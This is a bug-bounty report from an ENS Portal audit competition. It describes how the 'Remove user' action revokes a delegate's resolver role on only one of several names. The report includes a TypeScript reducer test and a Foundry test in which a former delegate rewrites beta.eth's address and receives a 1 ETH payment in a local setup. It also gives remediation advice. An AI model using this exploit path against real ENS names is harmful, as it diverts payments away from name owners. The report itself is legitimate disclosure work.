# 89761 w a critical removing a resolver user revokes only one displayed ens name allowing redirected incoming payments

## #89761 \[W\&A-Critical] Removing a resolver user revokes only one displayed ENS name, allowing redirected incoming payments

**Submitted on Aug 21st 2026 at 01:06:38 UTC by @rtw0x1 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89761
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information Notification/settings changes

### Description

### Brief/Intro

When the same resolver delegate has roles on two ENS names, the Portal groups both name-scoped grants into one displayed user. The owner-facing action says it will remove that user from all roles, but the transaction is constructed for only the first displayed name. A former delegate therefore retains `ROLE_SET_ADDR` on the omitted name, can redirect its Ethereum address after the owner completes removal, and can receive transfers sent to the address returned by normal resolution.

The prerequisite is explicit: the attacker is a former legitimate delegate whom the owner previously granted `ROLE_SET_ADDR` on at least two names, and the owner later uses the Portal's aggregate **Remove user** action. No owner key, wallet compromise, or role on a never-authorized name is required after removal.

### Vulnerability Details

* Affected asset: `https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal`
* Frozen/current version: `1c9b47f18fcddd2e864dfe385c4171061c9811ae`
* Attacker prerequisite: a former resolver delegate previously granted `ROLE_SET_ADDR` on two names represented in the same Portal row; the owner then invokes that row's **Remove user** action

The defect is a resource-identity collapse between the Portal's read model and mutation model:

1. [`groupRolesByAccount`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L179-L220) keys the table row only by account. It appends every per-resource role and every resolved name into one `AccountRoleGroup`.
2. [`ResolverRolesTable`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx#L102-L115) makes that aggregate account group the editable row.
3. [`ResolverRolesSidebar`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L173) selects only one name with `resolvedNames.find(...)`, while retaining the aggregate `decodedRoles` array.
4. The removal action passes that single `roleName` and the aggregate roles into the transaction intent ([lines 307-321](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L307-L321)), even though the confirmation says, “remove this user from all roles” ([lines 441-463](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L441-L463)).
5. [`prepareRevokeResolverRolesTransaction`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts#L29-L74) consequently encodes one name-scoped revoke. It does not iterate over the other resources represented by the row.

With `alpha.eth` and `beta.eth` granted to the same delegate, the exact prepared call decodes to an `authorizeNameRoles(..., false)` operation for `alpha.eth` only. `beta.eth` retains the delegate's `ROLE_SET_ADDR` bitmap.

### Impact Details

The closest in-scope impact is: **Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user.**

The proof executes the downstream consequence rather than stopping at stale authorization:

* Before removal, `beta.eth` resolves to the owner's address.
* After the Portal-equivalent one-name removal, the former delegate changes `beta.eth` to their own address.
* An owned payer obtains the destination from `resolver.addr(betaNode)` and transfers `1 ether` to it.
* The former delegate's balance increases by exactly `1 ether`; the owner's balance increases by `0`.
* In the complete-revocation control, the identical `setAddr` call reverts, `beta.eth` remains pointed at the owner, and the identical payment increases only the owner's balance.

This source-only competition proof uses isolated local accounts and local funds. It establishes deterministic payment routing rather than production loss. The affected security boundary is concrete: the owner completes the product's removal workflow, but the former delegate can still perform the protected write and redirect subsequent transfers sent through normal ENS resolution.

### Remediation

Preserve resource identity at the editable-row and mutation boundaries. Either:

* group rows by `(account, resource/name)` so each removal action has one unambiguous resource; or
* when an aggregate account row is removed, build and execute one exact revoke for every underlying name resource and that resource's own role bitmap.

The confirmation and completion states should enumerate every affected name and should report success only after every required per-resource revoke succeeds. Add a regression test with one delegate holding `ROLE_SET_ADDR` on two names and assert that both protected writes fail after removal.

### References

* [Affected Portal branch at the tested commit](https://github.com/immunefi-team/audit-comp-ens/tree/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal)
* [Account-only role grouping](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L179-L220)
* [Single-name selection and aggregate removal](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L173)
* [Name-scoped revoke construction](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts#L29-L74)
* [PermissionedResolver used only for downstream behavioral parity](https://github.com/ensdomains/contracts-v2/blob/48b3e2d39513b9dd32ef1850877a29009bc807b9/contracts/src/resolver/PermissionedResolver.sol)

### Proof of Concept

## Proof of Concept

### Prerequisites

* Git
* Node.js and `pnpm` 10.27.0
* Foundry (`forge`)
* Linux or macOS shell

No RPC URL, wallet, private key, token, or funded account is required.

### Steps To Reproduce

1. Create an isolated directory and check out the exact competition revision.

   ```bash
   export ENS_REPRO_ROOT="$(mktemp -d /tmp/ens-resolver-removal.XXXXXX)"
   git clone https://github.com/immunefi-team/audit-comp-ens.git "$ENS_REPRO_ROOT/portal"
   git -C "$ENS_REPRO_ROOT/portal" checkout --detach 1c9b47f18fcddd2e864dfe385c4171061c9811ae
   cd "$ENS_REPRO_ROOT/portal"
   pnpm install --frozen-lockfile
   ```

   Expected: `HEAD` is `1c9b47f18fcddd2e864dfe385c4171061c9811ae` and dependencies install successfully.
2. Save the following exact reducer as `apps/portal/src/resolver-role-retention.reducer.test.ts`.

   ```typescript
   import { permissionedResolverAuthorizeNameRolesSnippet } from '@ensdomains/ensjs-abi/v2/permissionedResolver'
   import {
     concatHex,
     decodeFunctionData,
     numberToHex,
     stringToHex,
     type Address,
     type Hex,
   } from 'viem'
   import { sepolia } from 'viem/chains'
   import { describe, expect, it } from 'vitest'
   import { prepareResolverRolesIntent } from '@/features/resolver/helpers/prepareResolverRolesIntent'
   import {
     buildResourceToNameMap,
     computeNameResource,
     groupRolesByAccount,
     resolverRoles,
     type ResolverRoleKey,
   } from '@/lib/roles/resolverRoles'

   const OWNER: Address = '0x7Bc153b2a4C8a2f3428bd0da77a901b81c6dD809'
   const DELEGATE: Address = '0x2222222222222222222222222222222222222222'
   const RESOLVER: Address = '0x3333333333333333333333333333333333333333'
   const NAME_A = 'alpha.eth'
   const NAME_B = 'beta.eth'

   // The reducer uses ASCII labels so this is byte-identical to ENSjs's
   // packetToBytes(name) encoding used by revokeResolverRolesWriteParameters.
   const dnsEncode = (name: string): Hex =>
     concatHex([
       ...name.split('.').map((label) =>
         concatHex([
           numberToHex(label.length, { size: 1 }),
           stringToHex(label),
         ]),
       ),
       '0x00',
     ])

   // biome-ignore lint/suspicious/noExplicitAny: minimal deterministic wallet mock
   const walletClient = { account: { address: OWNER }, chain: sepolia } as any

   const decodePreparedRevoke = (name: string, roles: ResolverRoleKey[]) => {
     const intent = prepareResolverRolesIntent(
       {
         type: 'remove',
         name,
         account: DELEGATE,
         roles,
       },
       RESOLVER,
       { walletClient, chainId: sepolia.id },
     )

     expect(intent).toBeDefined()
     if (!intent || intent.request.type !== 'eoa') {
       throw new Error('expected one prepared EOA revoke')
     }

     return decodeFunctionData({
       abi: permissionedResolverAuthorizeNameRolesSnippet,
       data: intent.request.data as Hex,
     })
   }

   describe('Portal resolver role removal across multiple name resources', () => {
     it('prepares one-name revocation while the same delegate remains authorized on the second displayed name', () => {
       const resourceToName = buildResourceToNameMap([
         { name: NAME_A },
         { name: NAME_B },
       ])
       const roles = [
         {
           account: DELEGATE,
           resource: computeNameResource(NAME_A),
           roleBitmap: `0x${resolverRoles.ROLE_SET_ADDR.toString(16)}`,
         },
         {
           account: DELEGATE,
           resource: computeNameResource(NAME_B),
           roleBitmap: `0x${resolverRoles.ROLE_SET_ADDR.toString(16)}`,
         },
       ]

       const grouped = groupRolesByAccount(roles, resourceToName)
       expect(grouped).toHaveLength(1)
       expect(grouped[0].resolvedNames).toEqual([NAME_A, NAME_B])
       expect(grouped[0].roles).toHaveLength(2)

       // Exact selection performed by ResolverRolesSidebar before its
       // "remove this user from all roles" confirmation.
       const roleName = grouped[0].resolvedNames.find((n) => n !== '(root)') ?? ''
       const aggregateRoles = grouped[0].decodedRoles as ResolverRoleKey[]
       const decoded = decodePreparedRevoke(roleName, aggregateRoles)

       expect(decoded.functionName).toBe('authorizeNameRoles')
       expect(decoded.args).toEqual([
         dnsEncode(NAME_A),
         resolverRoles.ROLE_SET_ADDR,
         DELEGATE,
         false,
       ])
       expect(decoded.args?.[0]).not.toBe(dnsEncode(NAME_B))

       // Faithful resource-level state reduction of that single contract call:
       // the selected name loses ROLE_SET_ADDR, while the second displayed name
       // keeps the protected record-writing authority.
       const remaining = new Map(
         roles.map((role) => [role.resource, BigInt(role.roleBitmap)]),
       )
       remaining.set(
         computeNameResource(roleName),
         remaining.get(computeNameResource(roleName))! &
           ~resolverRoles.ROLE_SET_ADDR,
       )

       expect(remaining.get(computeNameResource(NAME_A))).toBe(0n)
       expect(
         remaining.get(computeNameResource(NAME_B))! &
           resolverRoles.ROLE_SET_ADDR,
       ).toBe(resolverRoles.ROLE_SET_ADDR)
     })

     it('negative control: revoking each underlying resource clears both names', () => {
       const names = [NAME_A, NAME_B]
       const remaining = new Map(
         names.map((name) => [computeNameResource(name), resolverRoles.ROLE_SET_ADDR]),
       )

       for (const name of names) {
         const decoded = decodePreparedRevoke(name, ['ROLE_SET_ADDR'])
         expect(decoded.args?.[0]).toBe(dnsEncode(name))
         remaining.set(
           computeNameResource(name),
           remaining.get(computeNameResource(name))! &
             ~resolverRoles.ROLE_SET_ADDR,
         )
       }

       expect([...remaining.values()]).toEqual([0n, 0n])
     })
   })
   ```
3. Run the exact Portal reducer.

   ```bash
   cd "$ENS_REPRO_ROOT/portal/apps/portal"
   pnpm exec vitest run src/resolver-role-retention.reducer.test.ts
   ```

   Expected: both tests pass. The affected test proves one aggregate row contains `alpha.eth` and `beta.eth`, while the prepared revoke contains `alpha.eth` only and leaves `beta.eth`'s `ROLE_SET_ADDR` set.
4. Check out the public resolver implementation used to exercise the protected downstream effect.

   ```bash
   git clone https://github.com/ensdomains/contracts-v2.git "$ENS_REPRO_ROOT/contracts-v2"
   git -C "$ENS_REPRO_ROOT/contracts-v2" checkout --detach 48b3e2d39513b9dd32ef1850877a29009bc807b9
   git -C "$ENS_REPRO_ROOT/contracts-v2" submodule update --init --recursive
   ```

   Expected: `HEAD` is `48b3e2d39513b9dd32ef1850877a29009bc807b9`. This repository is used only to reproduce the consequence of the Portal's retained role; it is not claimed as the vulnerable asset.
5. Save the following harness as `contracts/test/unit/resolver/PermissionedResolverPaymentDiversion.t.sol`.

   ```solidity
   // SPDX-License-Identifier: MIT
   pragma solidity ^0.8.13;

   import {Test} from "forge-std/Test.sol";
   import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";
   import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
   import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
   import {PermissionedResolverLib} from "~src/resolver/libraries/PermissionedResolverLib.sol";
   import {PermissionedResolver} from "~src/resolver/PermissionedResolver.sol";

   contract PermissionedResolverPaymentDiversionTest is Test {
       VerifiableFactory internal factory;
       PermissionedResolver internal implementation;
       PermissionedResolver internal resolver;

       address internal owner = makeAddr("owner");
       address internal formerDelegate = makeAddr("formerDelegate");
       address internal payer = makeAddr("payer");

       bytes internal nameA;
       bytes internal nameB;
       bytes32 internal nodeB;

       function setUp() external {
           factory = new VerifiableFactory();
           implementation = new PermissionedResolver(address(this));
           nameA = NameCoder.encode("alpha.eth");
           nameB = NameCoder.encode("beta.eth");
           nodeB = NameCoder.namehash(nameB, 0);

           bytes memory initData = abi.encodeCall(
               PermissionedResolver.initialize,
               (owner, EACBaseRolesLib.ALL_ROLES, new bytes[](0))
           );
           resolver = PermissionedResolver(
               factory.deployProxy(
                   address(implementation),
                   uint256(keccak256(initData)),
                   initData
               )
           );

           vm.startPrank(owner);
           resolver.setAddr(nodeB, owner);
           resolver.authorizeNameRoles(
               nameA,
               PermissionedResolverLib.ROLE_SET_ADDR,
               formerDelegate,
               true
           );
           resolver.authorizeNameRoles(
               nameB,
               PermissionedResolverLib.ROLE_SET_ADDR,
               formerDelegate,
               true
           );
           vm.stopPrank();

           vm.deal(payer, 2 ether);
       }

       function test_incompleteRemovalDivertsPaymentToFormerDelegate() external {
           vm.prank(owner);
           resolver.authorizeNameRoles(
               nameA,
               PermissionedResolverLib.ROLE_SET_ADDR,
               formerDelegate,
               false
           );

           vm.prank(formerDelegate);
           resolver.setAddr(nodeB, formerDelegate);
           assertEq(resolver.addr(nodeB), formerDelegate, "former delegate controls beta.eth");

           uint256 ownerBefore = owner.balance;
           uint256 delegateBefore = formerDelegate.balance;
           address payable recipient = payable(resolver.addr(nodeB));

           vm.prank(payer);
           (bool sent,) = recipient.call{value: 1 ether}("");
           assertTrue(sent, "owned payment succeeds");

           emit log_named_address("resolved payment recipient after incomplete removal", recipient);
           emit log_named_uint("former delegate received wei", formerDelegate.balance - delegateBefore);
           emit log_named_uint("owner received wei", owner.balance - ownerBefore);
           assertEq(formerDelegate.balance - delegateBefore, 1 ether, "former delegate receives payment");
           assertEq(owner.balance, ownerBefore, "owner receives nothing");
       }

       function test_negativeControl_completeRemovalKeepsPaymentWithOwner() external {
           vm.startPrank(owner);
           resolver.authorizeNameRoles(
               nameA,
               PermissionedResolverLib.ROLE_SET_ADDR,
               formerDelegate,
               false
           );
           resolver.authorizeNameRoles(
               nameB,
               PermissionedResolverLib.ROLE_SET_ADDR,
               formerDelegate,
               false
           );
           vm.stopPrank();

           vm.expectRevert();
           vm.prank(formerDelegate);
           resolver.setAddr(nodeB, formerDelegate);
           assertEq(resolver.addr(nodeB), owner, "beta.eth remains owner-controlled");

           uint256 ownerBefore = owner.balance;
           uint256 delegateBefore = formerDelegate.balance;
           address payable recipient = payable(resolver.addr(nodeB));

           vm.prank(payer);
           (bool sent,) = recipient.call{value: 1 ether}("");
           assertTrue(sent, "owned control payment succeeds");

           emit log_named_address("resolved payment recipient after complete removal", recipient);
           emit log_named_uint("owner received wei", owner.balance - ownerBefore);
           emit log_named_uint("former delegate received wei", formerDelegate.balance - delegateBefore);
           assertEq(owner.balance - ownerBefore, 1 ether, "owner receives control payment");
           assertEq(formerDelegate.balance, delegateBefore, "former delegate receives nothing");
       }
   }
   ```
6. Run the downstream impact test.

   ```bash
   cd "$ENS_REPRO_ROOT/contracts-v2/contracts"
   forge clean
   forge test --match-path test/unit/resolver/PermissionedResolverPaymentDiversion.t.sol -vv
   ```

   Expected decisive output:

   ```
   [PASS] test_incompleteRemovalDivertsPaymentToFormerDelegate()
   resolved payment recipient after incomplete removal: 0x8E7E60458247994378D7c6a4361B2a19e18B70d6
   former delegate received wei: 1000000000000000000
   owner received wei: 0

   [PASS] test_negativeControl_completeRemovalKeepsPaymentWithOwner()
   resolved payment recipient after complete removal: 0x7c8999dC9a822c1f0Df42023113EDB4FDd543266
   owner received wei: 1000000000000000000
   former delegate received wei: 0
   ```
7. Remove the isolated local fixtures.

   ```bash
   test -n "$ENS_REPRO_ROOT"
   [[ "$ENS_REPRO_ROOT" == /tmp/ens-resolver-removal.* ]]
   rm -rf -- "$ENS_REPRO_ROOT"
   unset ENS_REPRO_ROOT
   ```

### Proof of Impact

| Run                             | Security-relevant input/state                                                                                        | Observed result                                                                                                                     |
| ------------------------------- | -------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| Complete-removal control        | Same owner, former delegate, names, role, resolver, payer, and 1 ETH payment; revoke both `alpha.eth` and `beta.eth` | Former delegate's `setAddr` reverts; `beta.eth` resolves to the owner; owner receives 1 ETH; former delegate receives 0             |
| Affected Portal-equivalent path | Change only the removal result: revoke `alpha.eth` while the aggregate row also represents `beta.eth`                | Former delegate changes `beta.eth`; the resolved recipient is the former delegate; former delegate receives 1 ETH; owner receives 0 |

The payer destination is read directly from the resolver in both arms. The sole security-relevant difference is whether the Portal's removal revokes every resource it represented. This binds the incomplete UI action to a protected blockchain-state change and a concrete funds-routing consequence.
